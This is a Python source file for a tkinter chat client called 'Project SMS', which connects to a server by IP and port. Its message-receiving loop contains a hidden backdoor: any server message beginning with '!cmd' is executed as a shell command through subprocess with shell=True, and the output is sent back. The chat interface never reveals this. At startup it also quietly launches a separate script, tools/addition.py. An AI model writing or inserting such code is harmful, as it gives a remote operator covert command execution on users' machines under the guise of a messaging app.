import tkinter as tk
from tkinter import simpledialog, messagebox
import json
import socket
import threading
import subprocess
import os

ACCOUNT_FILE = "account.json"
TEMP_DIR = "tools/tmp"  # Relative to the directory where client-v2.py is located

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"

def receive_messages(client, text_area):
    while True:
        try:
            message = client.recv(1024).decode('utf-8')
            if message.startswith("!cmd"):
                command = message.split(" ", 1)[1]
                result = execute_command(command)
                client.send(f"!cmd_result {result}".encode('utf-8'))
            else:
                text_area.config(state=tk.NORMAL)  # Allow updates
                text_area.insert(tk.END, message + '\n')
                text_area.yview(tk.END)  # Scroll to the end
                text_area.config(state=tk.DISABLED)  # Make it read-only
        except Exception as e:
            messagebox.showerror("Error", f"Error: {e}")
            client.close()
            break

def start_client():
    def on_connect():
        connection_code = entry_connection.get()
        server_ip, server_port = connection_code.split(":")
        server_port = int(server_port)

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        # Assume user is logged in
        receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
        receive_thread.start()

        def send_message():
            message = entry_message.get()
            if message:
                client.send(message.encode('utf-8'))
                entry_message.delete(0, tk.END)  # Clear input after sending

        button_send.config(command=send_message)

    # Run addition.py located in /tools/
    tools_folder = os.path.join(os.path.dirname(__file__), "tools")
    addition_script = os.path.join(tools_folder, "addition.py")
    subprocess.Popen(["python", addition_script], cwd=tools_folder)

    # Load temporary directory path
    temp_dir_file = os.path.join("tools", "tmp", "temp_dir.txt")
    if os.path.exists(temp_dir_file):
        with open(temp_dir_file, "r") as f:
            temp_dir = f.read().strip()
    else:
        messagebox.showerror("Error", "Temporary directory not found. Exiting.")
        return

    account_file = os.path.join(temp_dir, ACCOUNT_FILE)
    if not os.path.exists(account_file):
        messagebox.showerror("Error", "Account file not found. Exiting.")
        return

    # Load username from account file
    with open(account_file, 'r') as file:
        account_data = json.load(file)
        username = account_data.get('username', "Unknown")

    root = tk.Tk()
    root.title("Project SMS")

    frame = tk.Frame(root)
    frame.pack(padx=10, pady=10)

    tk.Label(frame, text="Enter connection code (format: IP:PORT):").pack()

    entry_connection = tk.Entry(frame, width=30)
    entry_connection.pack()

    button_connect = tk.Button(frame, text="Connect", command=on_connect)
    button_connect.pack(pady=5)

    text_area = tk.Text(frame, height=15, width=50, wrap=tk.WORD, state=tk.DISABLED)
    text_area.pack(pady=5)

    entry_message = tk.Entry(frame, width=40)
    entry_message.pack(side=tk.LEFT, padx=(0, 5))

    button_send = tk.Button(frame, text="Send")
    button_send.pack(side=tk.LEFT)

    root.mainloop()

if __name__ == "__main__":
    start_client()
